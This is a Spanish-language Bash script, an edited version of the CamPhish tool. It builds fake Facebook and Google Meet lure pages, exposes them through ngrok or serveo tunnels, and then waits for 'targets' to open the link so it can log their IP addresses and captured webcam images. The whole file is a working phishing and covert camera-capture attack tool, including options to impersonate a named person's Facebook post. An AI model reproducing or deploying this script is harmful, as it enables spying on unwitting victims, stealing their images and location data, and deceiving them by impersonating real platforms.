#! /bin/bash

trap 'printf "\n";stop' 2

banner() {
    clear
    printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
    printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
    printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
    printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
    printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
    printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
    printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
    printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"

    printf " \e[1;77m Autor original: www.techchip.net \e[0m \n"
    printf " \e[1;77m Editado por: Darling Buenaño y Carlos Almeida \e[0m \n\n"
	printf " \e[1;77m Repositorio de github: git clone https://github.com/DarlynYami05/CamPhish.git \e[0m \n\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "Se necesita PHP, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

    cat ip.txt >> saved.ip.txt
}


server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }

    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Iniciando Serveo...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
        sleep 8
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
        sleep 8
    fi
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Iniciando servidor php... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Link directo:\e[0m\e[1;77m %s\n' $send_link
}


camphish() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
    
    printf "\n-----Elija el servidor de tunel----\n"    
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
    default_option_server="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elija una opción de reenvío de puertos: [Por defecto es 1] \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    select_template
    
    if [[ $option_server -eq 2 ]]; then
        command -v php > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
        start
    elif [[ $option_server -eq 1 ]]; then
        ngrok_server
    else
        printf "\e[1;93m [!] Opción inválida!\e[0m\n"
        sleep 1
        clear
        camphish
    fi
}


select_template() {
    if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
        printf "\e[1;93m [!] ¡Opción de túnel no válida! inténtalo otra vez\e[0m\n"
        sleep 1
        clear
        banner
        camphish
    else
        printf "\n-----Elije una plantilla----\n"
        printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Meet\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Youtube\e[0m\n"
        
        default_option_template="1"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elije una plantilla: [Por defecto es 1] \e[0m' option_tem
        option_tem="${option_tem:-${default_option_template}}"

        ########## FACEBOOK ##########
        if [[ $option_tem -eq 1 ]]; then
            printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Plantilla Facebook elegida \e[0m\n"
            
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la persona que publicó: \e[0m' nombre_usuario_facebook
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de perfil: \e[0m' foto_perfil_facebook
            mv "$foto_perfil_facebook" "${foto_perfil_facebook// /-}" -n
            cp $foto_perfil_facebook templates/facebook/foto_perfil.jpeg
            foto_perfil_facebook='templates/facebook/foto_perfil.jpeg'
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción de la publicación: \e[0m' descripcion_facebook
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la foto de la publicación: \e[0m' foto_publicacion_facebook
            mv "$foto_publicacion_facebook" "${foto_publicacion_facebook// /-}" -n
            cp $foto_publicacion_facebook templates/facebook/foto_publicacion.jpeg
            foto_publicacion_facebook='templates/facebook/foto_publicacion.jpeg'
            ruta_template="facebook/facebook.html"


        ########## GOOGLE ##########
        elif [[ $option_tem -eq 2 ]]; then
            printf " Google Phising aún está en desarrollo"
            ruta_template="google/google.html"

        
        ########## INSTAGRAM ##########
        elif [[ $option_tem -eq 3 ]]; then
            printf " Instagram Phising aún está en desarrollo"
            ruta_template="instagram/instagram.html"


        ########## MEET ##########
        elif [[ $option_tem -eq 4 ]]; then
            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la reunión: \e[0m' Nombre_de_la_reunion
            #La linea siguiente quita los espacios en blanco
            #Nombre_de_la_reunion="${Nombre_de_la_reunion//[[:space:]]/}"

            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa nombres de personas conectadas: \e[0m' Nombre_personas_conectadas
            #Nombre_personas_conectadas="${Nombre_personas_conectadas//[[:space:]]/}"

            #El nombre del html debe ser igual al que se generará, no al template original
            ruta_template="meet/meet.html"


        ########## YOUTUBE ##########
        elif [[ $option_tem -eq 5 ]]; then
            printf " Youtube Phising aún está en desarrollo"
            ruta_template="youtube/youtube.html"
        
        else
            printf "\e[1;93m [!] ¡Opción de plantilla no válida! Inténtalo otra vez\e[0m\n"
            sleep 1
            select_template
        fi
    fi
}


ngrok_server() {
    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "Se necesita UNZIP, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "Se necesita WGET, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
        printf "\e[1;92m[\e[0m+\e[1;92m] Descargando Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)

        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Error en la descarga... Termux, correr:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi

        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "\e[1;93m[!] Error en la descarga... \e[0m\n"
                exit 1
            fi
        fi
    fi

    printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando el servidor de php...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando el servidor de ngrok...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 15

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\e[1;92m[\e[0m*\e[1;92m] Link directo:\e[0m\e[1;77m %s\e[0m\n" $link

    payload_ngrok
    checkfound
}


payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    sed -i 's+ruta_template+'$ruta_template'+g' index.php
    
    if [[ $option_tem -eq 1 ]]; then
        foto_perfil_facebook=$link'/'$foto_perfil_facebook
        foto_publicacion_facebook=$link'/'$foto_publicacion_facebook
        sed 's+foto_perfil_facebook+'$foto_perfil_facebook'+g' templates/facebook/facebook_t.html > templates/facebook/facebook.html
        sed -i 's+nombre_usuario_facebook+'$nombre_usuario_facebook'+g' templates/facebook/facebook.html
        sed -i 's+descripcion_facebook+'"$descripcion_facebook"'+g' templates/facebook/facebook.html
        sed -i 's+foto_publicacion_facebook+'$foto_publicacion_facebook'+g' templates/facebook/facebook.html

    elif [[ $option_tem -eq 4 ]]; then
        sed 's+Nombre_de_la_reunion+'$Nombre_de_la_reunion'+g' templates/meet/meet_t.html > templates/meet/meet.html
        sed -i 's+Nombre_personas_conectadas+'$Nombre_personas_conectadas'+1' templates/meet/meet.html

    else
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$Nombre_de_la_reunion'+g' index3.html > index2.html
    fi
    #rm -rf index3.html
}


checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando objetivos,\e[0m\e[1;77m Presione Ctrl + C para salir...\e[0m\n"
    
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] ¡El objetivo abrió el enlace!\n"
            catch_ip
            rm -rf ip.txt
        fi
        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] ¡Imagen recibida!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}


#----- Tunel Serveo -----#
payload() {
    ruta_template="meet/meet.html"
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed 's+forwarding_link+'$send_link'+g' "template.php" > "index.php"
    
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$facebook_nombre'+g' index3.html > index2.html

    else
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$Nombre_de_la_reunion'+g' index3.html > index2.html
    fi
    #rm -rf index3.html
}

start() {
    default_choose_sub="Y"
    default_subdomain="saycheese$RANDOM"

    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] ¿Cambiar de subdominio? (Por defecto:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
    read choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        subdomain_resp=true
        printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdominio: (Por defecto:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
        read subdomain
        subdomain="${subdomain:-${default_subdomain}}"
    fi

    server
    payload
    checkfound
}

banner
dependencies
camphish